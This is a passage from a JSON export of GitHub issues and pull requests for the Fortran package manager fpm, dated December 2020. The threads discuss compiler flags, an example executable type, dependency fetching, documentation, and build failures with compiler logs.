                    "text": "If it literally is causing failures on any platform we need to take it out and for now Intel users can use a config file to enable it and hopefully soon additional flags will be supported in the TOML file and perhaps with --fflags|--flags on the fpm command line; but having coarray syntax be illegal by default is not very appealing so I am hoping -coarray=single is good everywhere and from the documentation I thought it would be; but that does not seem to be the case?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-10 01:24:31+00:00",
                    "text": "On MacOS it just issues a warning (sometimes) and ignores any -coarray flag. However, any code with coarray features cannot be compiled with ifort on MacOS."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 16:23:53+00:00",
                    "text": "which raises the thought of whether we should have a shared set of fpm repositories and a quick basic test of them\n\nThis is a good point and could be a useful to add to our automated CI checks."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-13 12:09:22+00:00",
                    "text": "Fixed by #300"
                }
            ]
        },
        {
            "number": 281,
            "user": "awvwgk",
            "date": "2020-12-08 21:46:46+00:00",
            "title": "Cleanup: Remove archived Rust prototype",
            "text": "As discussed in #253, this PR removes the archived Rust prototype from the repository.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-09 16:16:19+00:00",
                    "text": "Thanks @awvwgk I will merge"
                }
            ]
        },
        {
            "number": 280,
            "user": "awvwgk",
            "date": "2020-12-08 19:13:29+00:00",
            "title": "Create specification for example section",
            "text": "Add manifest reference for example applications\n Add example manifest type to Fortran fpm\n Integrate example in build command\n Allow running example applications in run command\n Implement example in Haskell fpm as well\n\nFixes #275",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-10 16:46:47+00:00",
                    "text": "Thanks for the fast review, I will go ahead and merge this PR soonish (after #266)."
                }
            ]
        },
        {
            "number": 278,
            "user": "awvwgk",
            "date": "2020-12-08 17:31:22+00:00",
            "title": "Enable discussions for this repository?",
            "text": "GitHub discussions is now in public beta and might be a suitable addition for discussion on fpm separated from the issues. It is currently opt-in at the settings tab of the repo.\nThis might overlap slightly with what we are currently using issues for and also maybe with the Fortran-lang discourse.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-12-08 17:41:19+00:00",
                    "text": "Good idea, I support it. fpm discussions on the Discourse so far were, I think, due to not there being any dedicated place to discuss fpm specifically.\nWe can enable it. Before we do, has anybody had experience with it? Is it ready for prime time?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-08 17:43:38+00:00",
                    "text": "I have seen it around at some other more popular repos, but not used it in my projects so far. I just enabled it at http://github.com/grimme-lab/xtb/discussions."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-08 17:49:10+00:00",
                    "text": "I just enabled it. I think I will like it. Worst case scenario, if it doesn't work for any reason, we turn it off."
                }
            ]
        },
        {
            "number": 277,
            "user": "LKedward",
            "date": "2020-12-08 16:54:21+00:00",
            "title": "Refactor: separate source parsing routines from source discovery",
            "text": "I'm in the process of adding developer documentation and I'd like to move the source parsing routines out of the fpm_sources module to better separate source parsing from source file discovery.\nThis PR moves the low-level source parsing routines to a new fpm_source_parsing module.\nThere are no functional changes in this PR \u2014 you can check this using git diff 1a7f3a4~ 1a7f3a4 --color-moved at the terminal after checking out the branch.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-10 10:10:23+00:00",
                    "text": "Changes applied by #284"
                }
            ]
        },
        {
            "number": 276,
            "user": "milancurcic",
            "date": "2020-12-08 15:47:04+00:00",
            "title": "Make Fortran binaries appear first in the list of release assets",
            "text": "https://github.com/fortran-lang/fpm/releases\nCurrently we have:\n\nfpm-bootstrap-v0.1.1-linux-x86_64\n...\nfpm-v0.1.1-linux-x86_64\n...\n\nAssets are sorted alphabetically, so fpm-bootstrap-* binaries come first. It's possible that, not knowing the difference, some users will reach for the bootstrap binaries first. Instead, we should gear them toward the Fortran binaries first, although it has shown recently that it's useful to have both, due to bugs and incomplete features on both sides.\nI recommend that we have the Fortran binaries appear first at the list of assets.\nAn easy fix would be to drop the \"v\" from the semantic version because it's the \"v\" that makes the Fortran binaries come after the Haskell ones. \"v\" is not that common anyway--you're more likely to see something like gcc-9.3.0 than gcc-v9.3.0.\nAlso, related to #253, considering that the \"bootstrapping\" property is no longer unique to the Haskell fpm, I suggest we just distribute these as fpm-haskell-* instead of fpm-bootstrap-*, to minimize confusion.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-08 15:55:18+00:00",
                    "text": "Good points, I agree with you on all three. This should be a relatively simple change to the CI."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-08 16:17:31+00:00",
                    "text": "https://github.com/fortran-lang/setup-fpm/ which will also need updating (also simple)."
                }
            ]
        },
        {
            "number": 275,
            "user": "awvwgk",
            "date": "2020-12-08 07:10:17+00:00",
            "title": "Allow example as special executable type",
            "text": "Suggested in #257 (review).\nAdditionally to the currently available executable and test tables an example table would allow to have usage example in a project which do not count as production executables but rather as demonstrations.\nThe syntax would be identical to the executable and test table with:\n[[example]]\nname = \"demo\"\nsource-dir = \"example\"  # suggestions for the default dir?\nmain = \"main.f90\"\nAlso, example executables can be automatically discovered like executables or test:\n[build]\nauto-examples = true",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-12-08 15:59:33+00:00",
                    "text": "I love this idea. I now see that Cargo has it too.\nHaving examples as a kind of binary would encourage people to write more examples on how to use their libraries.\nI personally learn more easily from runnable examples than from documentation.\nexamples/ seems to me like a good directory name. Just like Cargo.\nI also think all programs in examples/ should be built automatically (like tests), without a special flag in the manifest."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-08 17:55:42+00:00",
                    "text": "I was thinking  about something like this and had in mind dev/  for developer and then maybe having subdirectories like example|sample, benchmark, so as not to clutter the top directory too much,  but if example/  (and benchmark/ ?) are already in common use ( any measure of the audience different package managers have?)  and no one sees that becoming a dozen directories then just starting with example/  (or  demo/ or sample/, I personally have no strong preference on that name) .\nSo should the new subcommand generate an example/ directory?\nI also confuse myself when I do not adhere to a strict rule about plurals.  If we are using /app and /test I think it should be /example instead of /examples. So far we have stuck to the singular and mixing that makes it harder to remember."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-08 18:14:08+00:00",
                    "text": "FWIW, Cargo uses src, benches, examples, and tests (https://doc.rust-lang.org/cargo/guide/project-layout.html).\nAlthough \"benches\" is is perhaps more technically accurate, I like how \"benchmarks\" sounds."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-08 19:05:27+00:00",
                    "text": "OK. I think there should be a switch on new for the two new ones and that they should be adopted as above into the metrics.  I waffle between whether they should be created by default with new though.  I think an install should not install those files so a simple install would just be for apps. With a new category in the TOML file as proposed above it would be easy to skip installing them.  With the no autobuild option you could prevent the possibly annoying build of every test and demo and benchmark every time you make a source code and just want to build your main src/ stuff or just do an fpm test so I think that works for me. I wonder if the default for bench|benches|benchmark and example|examples should be no auto build but that would be easier to decide with a working prototype.\nI know I have a bias here and not sure how common the need is for everyone but my aspiration when building a library|module for public consumption is that each routine have a manpage with a working demo program that I automatically extract and build and run so it is testable. That can mean having dozens of small example programs that I do not want included in an install (I say aspiration because I do not always get around to that, but really thing it is a good practice!). So speaking personally this would be great."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-08 19:11:19+00:00",
                    "text": "PS:  I use scale/ but I think benchmark/ is better."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 18:05:41+00:00",
                    "text": "I decided to just go ahead and create a PR to update both Fortran and Haskell fpm with an example program type. Since we are using singular nouns for test and executable I used this for example as well. Let me know what you think."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-09 18:12:01+00:00",
                    "text": "Personally I prefer \"tests\" and \"examples\" (plural) as it encourages making multiples of those, and most packages would benefit from multiple tests and examples. For \"app\" I'm okay with singular because application packages are more likely to be singular (I think?).\nSo I suggest changing \"test\" to \"tests\" sooner rather than later.\nBut this is minor preference--60/40 kind of thing. :)"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 19:02:08+00:00",
                    "text": "I was more thinking about being compatible with the table names here, changing those is harder, not impossible, TOML-Fortran can easily migrate such a change in a backwards compatible way. For the default directory names, we can discuss changing those in another PR, for now I would like to be consistent with the existing implementation (one feature at a time)."
                }
            ]
        },
        {
            "number": 274,
            "user": "LKedward",
            "date": "2020-12-07 15:18:07+00:00",
            "title": "Update README with link to setup-fpm github action.",
            "text": "",
            "comments": []
        },
        {
            "number": 273,
            "user": "awvwgk",
            "date": "2020-12-06 23:07:00+00:00",
            "title": "Update developer documentation (manifest + command line)",
            "text": "Now that @milancurcic has created https://fpm.fortran-lang.org we should populate the documentation a bit. I will make a start with the manifest and the command line.\n\npopulate the landing page at https://fpm.fortran-lang.org\nlink with the TOML homepage and describe the package manifest format\nsketch the implementation of the TOML parsing and link to TOML-Fortran\ndescribe the scope of fpm with respect to the package manifest\nlink with the M_CLI2 repository and describe the command line interface\nadd a short documentation on the usage of M_CLI2 for the command line\ndescribe the process of adding new subcommands and arguments\noutline the generation of the developer pages and link to the FORD wiki",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-07 03:09:26+00:00",
                    "text": "Up till now I had put the calls to M_CLI2 in.  Recently the include command was added without any assist from me, so their might be some fresh insights there on how hard that was to do. I have used something M_CLI2 was drawn from (M_kracken) for so long it is almost a reflex for me to use it. But I can put something together pretty quickly on how to add a new subcommand if you like. I have not gone back to add direct support of subcommands in M_CLI2. That is something it does not directly support as a feature, but I thought it has held up well enough so far (and recently was compiled with ifort, nvfortran, and nagfor and appears to work) so"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-07 11:01:00+00:00",
                    "text": "Another big thing would be the documentation of the model and the build process, @LKedward would you like to write something on this or should I give it a try? However I would make the documentation of the model and build process a separate PR."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-07 11:04:40+00:00",
                    "text": "Another big thing would be the documentation of the model and the build process, @LKedward would you like to write something on this or should I give it a try?\n\nYep I would be happy to \ud83d\udc4d. I'll start work for a separate PR - should I add to docs.md or create a new page?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-07 11:09:52+00:00",
                    "text": "My strategy in this PR is to create a small introduction on the landing page regarding all important aspects of fpm, so far the manifest, command line and the documentation, and link to the respective parts in the pages, the module docs or external resources, whatever is appropriate and most useful."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-08 14:18:26+00:00",
                    "text": "This is a great start on improving (creating) the developer documentation and doesn't contain any code changes so I'll now merge. Thanks @awvwgk. I'll have a PR building on this soon."
                }
            ]
        },
        {
            "number": 272,
            "user": "LKedward",
            "date": "2020-12-06 12:33:05+00:00",
            "title": "Use fpm as an test package in the CI",
            "text": "As discussed, we should build, run and test fortran fpm using fortran fpm in the CI just like we do with the existing example packages.",
            "comments": []
        },
        {
            "number": 271,
            "user": "LKedward",
            "date": "2020-12-05 17:25:23+00:00",
            "title": "Fix Windows run and test commands",
            "text": "Removes a hard-code forward-slash in the model definition. Fixes #269.\nUpdates CI scripts to invoke fpm run and fpm test for the fortran implementation. Fixes #270.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-08 14:09:30+00:00",
                    "text": "I'll also merge this today if there are no more comments, and create a new prerelease v0.1.2."
                }
            ]
        },
        {
            "number": 270,
            "user": "LKedward",
            "date": "2020-12-05 16:49:21+00:00",
            "title": "`fpm run` and `fpm test` are not tested in the CI",
            "text": "This resulted in #269",
            "comments": []
        },
        {
            "number": 269,
            "user": "LKedward",
            "date": "2020-12-05 16:45:26+00:00",
            "title": "'fpm run' and 'fpm test' do not work on Windows",
            "text": "C:\\msys64\\home\\lk\\git\\fpm\\fpm>fpm run -- run\n + build/gfortran_debug\\app\\fpm.exe\n'build' is not recognized as an internal or external command,\noperable program or batch file.\n Command failed\nERROR STOP\nAppears to be due to a hard-coded forward slash here:\n\n  \n    \n      fpm/fpm/src/fpm.f90\n    \n    \n         Line 174\n      in\n      af67eae\n    \n    \n    \n    \n\n        \n          \n           model%output_directory = 'build/gfortran_release' \n        \n    \n  \n\n\nand here:\n\n  \n    \n      fpm/fpm/src/fpm.f90\n    \n    \n         Line 184\n      in\n      af67eae\n    \n    \n    \n    \n\n        \n          \n           model%output_directory = 'build/gfortran_debug'",
            "comments": []
        },
        {
            "number": 268,
            "user": "everythingfunctional",
            "date": "2020-12-05 06:28:48+00:00",
            "title": "Fix dependency tracking issue in bootstrap version",
            "text": "The bootstrap version was not correctly marking library modules as dependencies in the compilation process, leading to improper partial rebuilds in some situations. This fixes that issue.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-06 01:01:32+00:00",
                    "text": "Thanks for confirming. Merging now."
                }
            ]
        },
        {
            "number": 267,
            "user": "LKedward",
            "date": "2020-12-03 15:37:24+00:00",
            "title": "Fix enumeration of non-library link objects",
            "text": "Fixes #263 caused by missing out some non-library dependencies in link_objects list for executable targets.\nUpdate target dependency test-suite to build and check the link_objects list for link targets\nUpdate hello_complex_2 example package to include an indirectly use'd non-library module dependency\n\niso_varying_string now builds with Fortran fpm and unit tests pass (fpm test unit_test).",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-03 17:43:18+00:00",
                    "text": "\ud83d\udc4d  Thanks for fixing it @LKedward"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-08 14:07:58+00:00",
                    "text": "Thanks for reviewing @awvwgk. I'll merge later today if there are no more comments."
                }
            ]
        },
        {
            "number": 266,
            "user": "awvwgk",
            "date": "2020-12-02 20:18:47+00:00",
            "title": "Dependency handling",
            "text": "Take two on the dependency handling (see #251 for a recursive implementation).\n\n create a dependency tree data type with serde functionality\n allow translation from and to TOML of dependency tree\n implement iterative fetching of each dependency level\n use dependency tree in build_model\n update functionality for fpm-update subcommand\n build_model should use the dependency tree exclusively\n\nRelated #121\nFixes #265\nProposed command line interface for fpm-update\nName\n    fpm-update(1) - manage project dependencies\n\nSynopsis\n    fpm update [--fetch-only] [--verbose] [--clean] [name(s)]\n\nDescription\n    Manage and update project dependencies. If no dependency names are\n    provided all the dependencies are updated automatically.\n\nOptions\n  --clean       Ignore an existing package cache file\n  --fetch-only  Only fetch dependencies, do not update existing projects\n  --verbose     Show additional printout\n\nExamples\n 1. Initialize all project dependencies\n\n    fpm update --fetch-only\n\n 2. Update a list of dependencies\n\n    fpm update --verbose dep1 dep2\n\nDependency management strategy\n\ndependencies are handled iteratively\ncurrent project is added as first project to the dependency tree\nall nodes in the dependency tree visited and their dependencies are added to the tree\nrepeat step 3 until all dependencies in the tree are visited\ncreate a cache of the dependency tree (build/cache.toml)",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-05 19:40:45+00:00",
                    "text": "I getting toward a working version here, one issue I noted is that git tags are not reliable and we have to treat them like branch names for now. One can actually force push and delete a tag with git, making it impossible to tell for fpm whether or not a dependency is fetched correctly without retrieving upstram. Therefore, I moved the TOML-Fortran pinning from tag to rev.\nRight now the version is fully functional, while doing still a bit of redundant work for the fpm-build model, effectively walking the dependency tree twice, but the depth first approach of fpm-build will always find the already fetched dependencies from the dependency tree initialization doing no harm. I'll clean this up soon, but open the PR for feedback already.\nCleaned up and ready for review."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-06 13:33:12+00:00",
                    "text": "Seems like I always overlook parts of the command line documentation, I have to make a checklist for creating new commands to make sure I get it added to all the right places for the next time. Thanks for the reminder."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-08 19:50:34+00:00",
                    "text": "I would like to move at least one of new commands (fpm-install / fpm-update) forward to focus again on the fpm-dist command. Let me know if there is anything blocking this PR in particular."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-08 22:05:04+00:00",
                    "text": "Let me know if there is anything blocking this PR in particular.\n\nI'm happy for this PR to move forward; it would be good to get a second review if possible."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 10:44:00+00:00",
                    "text": "Since this PR will close multiple issues and allow work to move forward elsewhere I think this can be merged if there are no further comments. @awvwgk are you happy to merge when you're ready?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-10 11:08:59+00:00",
                    "text": "Sounds good, I will rebase and merge this branch later today. If there are problems coming up later we can still handle those separately."
                }
            ]
        },
        {
            "number": 265,
            "user": "everythingfunctional",
            "date": "2020-12-01 02:39:11+00:00",
            "title": "Failure to build jsonff",
            "text": "I wanted to see how well the Fortran version was doing (I haven't really used it at all yet). I tried building my jsonff package and got the following error.\n + gfortran -c build/dependencies/iso_varying_string/src/ISO_VARYING_STRING.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_iso_varying_string_src_ISO_VARYING_STRING.f90.o\n + gfortran -c build/dependencies/erloff/src/Module_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Module_m.f90.o\n + gfortran -c build/dependencies/erloff/src/Procedure_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Procedure_m.f90.o\n + gfortran -c build/dependencies/strff/src/strff.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_strff_src_strff.f90.o\n + gfortran -c build/dependencies/erloff/src/Call_stack_entry_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Call_stack_entry_m.f90.o\n + gfortran -c build/dependencies/erloff/src/Call_stack_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Call_stack_m.f90.o\n + gfortran -c build/dependencies/erloff/src/Message_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Message_m.f90.o\n + gfortran -c build/dependencies/erloff/src/Error_list_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Error_list_m.f90.o\n + gfortran -c build/dependencies/erloff/src/Message_list_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Message_list_m.f90.o\n + gfortran -c build/dependencies/erloff/src/erloff.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_erloff.f90.o\n + gfortran -c build/dependencies/parff/src/parff.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_parff_src_parff.f90.o\n + gfortran -c ./src/jsonff.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/jsonff.f90.o\n./src/jsonff.f90:46:17:\n\n   46 |             join, &\n      |                 1\nError: Symbol 'readfile' referenced at (1) not found in module 'strff'\ncompilation terminated due to -fmax-errors=1.\n Command failed\nERROR STOP \n\nError termination. Backtrace:\n#0  0x101fc4ebd\n#1  0x101fc5b75\n#2  0x101fc6f03\n#3  0x101f109f8\n#4  0x101efd552\n#5  0x101efcc32\n#6  0x101efdffd\n#7  0x101ef8ddd\n#8  0x101f92886\n\nThis error is from MacOS, but a similar one is emitted on Linux. It appears it is fetching the incorrect version of strff. It fetched version 1.0.0, but version 1.2.0 is specified in the fpm.toml. Maybe it's fetching dependencies depth first instead of breadth first?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-01 08:42:30+00:00",
                    "text": "Thanks for reporting, yes it's fetching depth first. Since we don't (yet) check for conflicting versions in dependencies, is breadth first the correct/preferred way of fetching?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-01 15:55:41+00:00",
                    "text": "By doing breadth first, the user can manually specify a specific version for a dependency if there are any conflicts, because it fetches exactly what they've specified first."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-01 16:08:15+00:00",
                    "text": "Ah I see, thanks for explaining."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-02 20:29:43+00:00",
                    "text": "I was using jsonff to test my dependency resolution, so this issue will probably be fixed with #266."
                }
            ]
        },
        {
            "number": 264,
            "user": "everythingfunctional",
            "date": "2020-12-01 02:28:47+00:00",
            "title": "Failure to build vegetables",
            "text": "I wanted to see how well the Fortran version was doing (I haven't really used it at all yet). I tried building my vegetables package and got the following error.\nUnable to find source for module dependency: \"parff\" used by \"app/make_driver_m.f90\"\nERROR STOP 1\n\nError termination. Backtrace:\n#0  0x105acfebd\n#1  0x105ad0b75\n#2  0x105ad1f6e\n#3  0x105a03440\n#4  0x105a9b886\n\nLooks like it just isn't fetching the dependency specified for the executable, as seen in the below fpm.toml file.\nname = \"vegetables\"\nversion = \"6.0.0\"\nlicense = \"MIT\"\nauthor = \"Brad Richardson\"\nmaintainer = \"everythingfunctional@protonmail.com\"\ncopyright = \"2020 Brad Richardson\"\n\n[dependencies]\n  iso_varying_string = { git = \"https://gitlab.com/everythingfunctional/iso_varying_string.git\", tag = \"v2.0.0\" }\n  strff = { git = \"https://gitlab.com/everythingfunctional/strff.git\", tag = \"v2.0.0\" }\n\n[[executable]]\n  name = \"make_vegetable_driver\"\n  source-dir = \"app\"\n  main = \"main.f90\"\n  [executable.dependencies]\n    parff = { git = \"https://gitlab.com/everythingfunctional/parff.git\", tag = \"v2.0.0\" }",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-01 07:07:36+00:00",
                    "text": "Duplicate of #228"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-06 08:01:18+00:00",
                    "text": "This issue might be fixed with #266 and #267 together. Trying with #266 triggers a similar error like in #263."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 17:13:56+00:00",
                    "text": "With #266 and #267 merged, there's a new error due to a bug in the source parsing routines which is incorrectly detecting a module as a program. I will look into a fix"
                }
            ]
        },
        {
            "number": 263,
            "user": "everythingfunctional",
            "date": "2020-12-01 02:24:07+00:00",
            "title": "Failure to build iso_varying_string",
            "text": "I wanted to see how well the Fortran version was doing (I haven't really used it at all yet). I tried building my iso_varying_string package and got the following error.\n + gfortran  build/gfortran_debug/test/unit_test_main.f90.o build/gfortran_debug/test/unit_test_adjustl_test.f90.o build/gfortran_debug/test/unit_test_adjustr_test.f90.o build/gfortran_debug/test/unit_test_assignment_test.f90.o build/gfortran_debug/test/unit_test_char_test.f90.o build/gfortran_debug/test/unit_test_concat_test.f90.o build/gfortran_debug/test/unit_test_equal_test.f90.o build/gfortran_debug/test/unit_test_extract_test.f90.o build/gfortran_debug/test/unit_test_greater_than_equal_test.f90.o build/gfortran_debug/test/unit_test_greater_than_test.f90.o build/gfortran_debug/test/unit_test_iachar_test.f90.o build/gfortran_debug/test/unit_test_ichar_test.f90.o build/gfortran_debug/test/unit_test_index_test.f90.o build/gfortran_debug/test/unit_test_insert_test.f90.o build/gfortran_debug/test/unit_test_len_test.f90.o build/gfortran_debug/test/unit_test_len_trim_test.f90.o build/gfortran_debug/test/unit_test_less_than_equal_test.f90.o build/gfortran_debug/test/unit_test_less_than_test.f90.o build/gfortran_debug/test/unit_test_lge_test.f90.o build/gfortran_debug/test/unit_test_lgt_test.f90.o build/gfortran_debug/test/unit_test_lle_test.f90.o build/gfortran_debug/test/unit_test_llt_test.f90.o build/gfortran_debug/test/unit_test_not_equal_test.f90.o build/gfortran_debug/test/unit_test_remove_test.f90.o build/gfortran_debug/test/unit_test_repeat_test.f90.o build/gfortran_debug/test/unit_test_replace_range_test.f90.o build/gfortran_debug/test/unit_test_replace_start_test.f90.o build/gfortran_debug/test/unit_test_replace_target_test.f90.o build/gfortran_debug/test/unit_test_scan_test.f90.o build/gfortran_debug/test/unit_test_split_character_set_test.f90.o build/gfortran_debug/test/unit_test_split_string_set_test.f90.o build/gfortran_debug/test/unit_test_trim_test.f90.o build/gfortran_debug/test/unit_test_var_str_test.f90.o build/gfortran_debug/test/unit_test_verify_test.f90.o -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/iso_varying_string build/gfortran_debug/iso_varying_string/libiso_varying_string.a  -o build/gfortran_debug/test/unit_test\nUndefined symbols for architecture x86_64:\n  \"___custom_generator_MOD___vtab_3126CD9\", referenced from:\n      ___repeat_test_MOD_test_repeat in unit_test_repeat_test.f90.o\n  \"___custom_generator_MOD___vtab_custom_generator_Ascii_character_generator_t\", referenced from:\n      ___iachar_test_MOD_test_iachar in unit_test_iachar_test.f90.o\n      ___ichar_test_MOD_test_ichar in unit_test_ichar_test.f90.o\n  \"___custom_generator_MOD___vtab_custom_generator_Ascii_string_pair_generator_t\", referenced from:\n      ___concat_test_MOD_test_concat in unit_test_concat_test.f90.o\n      ___equal_test_MOD_test_equals in unit_test_equal_test.f90.o\n      ___greater_than_equal_test_MOD_test_greater_than_equals in unit_test_greater_than_equal_test.f90.o\n      ___greater_than_test_MOD_test_greater_than in unit_test_greater_than_test.f90.o\n      ___index_test_MOD_test_index in unit_test_index_test.f90.o\n      ___less_than_equal_test_MOD_test_less_than_equals in unit_test_less_than_equal_test.f90.o\n      ___less_than_test_MOD_test_less_than in unit_test_less_than_test.f90.o\n      ...\n  \"___custom_generator_MOD___vtab_custom_generator_Character_input_t\", referenced from:\n      ___iachar_test_MOD_check_iachar in unit_test_iachar_test.f90.o\n      ___ichar_test_MOD_check_ichar in unit_test_ichar_test.f90.o\n  \"___custom_generator_MOD___vtab_custom_generator_String_and_integer_input_t\", referenced from:\n      ___repeat_test_MOD_check_repeat in unit_test_repeat_test.f90.o\n  \"___custom_generator_MOD___vtab_custom_generator_String_pair_input_t\", referenced from:\n      ___concat_test_MOD_check_concat_character_and_string in unit_test_concat_test.f90.o\n      ___concat_test_MOD_check_concat_string_and_character in unit_test_concat_test.f90.o\n      ___concat_test_MOD_check_concat_strings in unit_test_concat_test.f90.o\n      ___equal_test_MOD_check_string_equal_character in unit_test_equal_test.f90.o\n      ___equal_test_MOD_check_character_equal_string in unit_test_equal_test.f90.o\n      ___equal_test_MOD_check_string_equal_string in unit_test_equal_test.f90.o\n      ___greater_than_equal_test_MOD_check_string_greater_than_equal_character in unit_test_greater_than_equal_test.f90.o\n      ...\nld: symbol(s) not found for architecture x86_64\ncollect2: error: ld returned 1 exit status\n Command failed\nERROR STOP \n\nError termination. Backtrace:\n#0  0x106e70ebd\n#1  0x106e71b75\n#2  0x106e72f03\n#3  0x106dbb9f8\n#4  0x106da8810\n#5  0x106da90b2\n#6  0x106da7a0f\n#7  0x106e3d894\n\nThis error is from MacOS, but a similar one is emitted on Linux. I suspect an issue with ordering of things in the link command, but I'm not sure.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-01 08:38:14+00:00",
                    "text": "Thanks for trying it out @everythingfunctional and reporting these. It appears there's a bug where tests and executables are only linked to non-library modules that they use directly. Non-library modules that are used via other modules are not added to the link list. Since this relates to the refactoring in #248, I will prepare a fix and tests for after that is merged."
                }
            ]
        },
        {
            "number": 262,
            "user": "everythingfunctional",
            "date": "2020-12-01 02:13:48+00:00",
            "title": "Add -fcoarray=single to default gfortran flags",
            "text": "By adding this flag to the default set, fpm can at least compile code using coarray features by default if not actually run multiple images.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-01 17:08:10+00:00",
                    "text": "\ud83d\udc4d , I'll go ahead and merge then since it's such a small change"
                }
            ]
        },
        {
            "number": 261,
            "user": "awvwgk",
            "date": "2020-11-30 22:18:13+00:00",
            "title": "Create a specification of the fpm command line interface (pandoc)",
            "text": "Create fpm(1) and the currently available six subcommand manual pages.\nTo check the resulting manual pages on the command line translate them with pandoc:\npandoc -s -t manpage fpm.1.md\nman -l fpm.1\n\n\nPandoc is written is Haskell and requires the usual set of Haskell dependencies, which you should have around anyway to compile Bootstrap fpm with stack.\n\nPlease review this PR while comparing to #230 and consider the following points\n\nsetup/usage of the toolchain\nthe markup language to express the command line documentation\nthe output (both HTML and roff/man page)\nthe preview on GH\n\nCloses #227\nCloses #230",
            "comments": []
        },
        {
            "number": 260,
            "user": "LKedward",
            "date": "2020-11-30 15:55:23+00:00",
            "title": "Fix CI to test release build",
